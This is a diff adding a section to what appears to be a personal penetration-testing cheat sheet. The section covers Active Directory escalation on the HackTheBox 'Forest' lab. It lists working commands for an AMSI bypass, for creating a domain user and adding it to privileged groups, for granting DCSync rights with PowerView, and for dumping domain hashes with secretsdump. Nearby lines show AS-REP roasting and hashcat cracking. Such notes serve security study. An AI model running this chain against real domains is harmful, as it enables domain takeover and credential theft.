@@ -2872,6 +2872,25 @@ impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives u
 hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 ```
 
+### Account Operator and WriteDacl or DCSync AD 
+- I saw the bloowhound has the WriteDACL and DCSync attack
+- I situation where user in account operator group the user create users add into groups [article](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators)
+- And create the user add into groups try the DCSync attack
+
+```powershell
+Bypass-4MSI # Bypass powershell 
+upload PowerView.ps1
+. .\PowerView.ps1
+net user ashok Ashok@123 /add /domain # Forest HTB
+net group "Exchange Windows Permissions" /add ashok # This group found in the Bloodhound report
+net localgroup "Remote Management Users" /add ashok
+$pass = convertto-securestring 'Ashok@123' -asplain -force
+$creds = new-object system.management.automation.pscredential('htb\ashok',$pass)
+Add-ObjectACL -PrincipalIdentity ashok -Credential $cred -Rights DCSync
+impacket-secretsdump htb/ashok:'Ashok@123'@10.10.10.161  # After success of above command
+```
+
+
 ### Kerberoasting
 
 ```powershell
